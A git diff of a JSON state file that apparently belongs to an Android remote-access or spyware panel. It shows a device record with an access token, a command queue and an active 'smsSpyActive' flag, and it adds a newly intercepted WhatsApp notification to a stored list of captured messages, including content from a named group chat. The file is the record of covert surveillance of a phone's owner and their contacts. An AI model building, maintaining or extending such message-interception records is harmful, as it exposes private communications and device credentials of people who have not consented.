@@ -116,7 +116,7 @@
     "deviceName": "HP-DDD-6DEF",
     "ownerUsername": "kamu cii",
     "token": "246f790ea49ac7f86fc663e710b7b286",
-    "lastSeen": 1775818418592,
+    "lastSeen": 1775818441830,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-10T10:06:23.436Z",
@@ -132,6 +132,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎88 pesan dari 4 chat",
+        "time": "10/04 18:53",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775818421527
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎Senam Rappocini (7 pesan): ~ .",
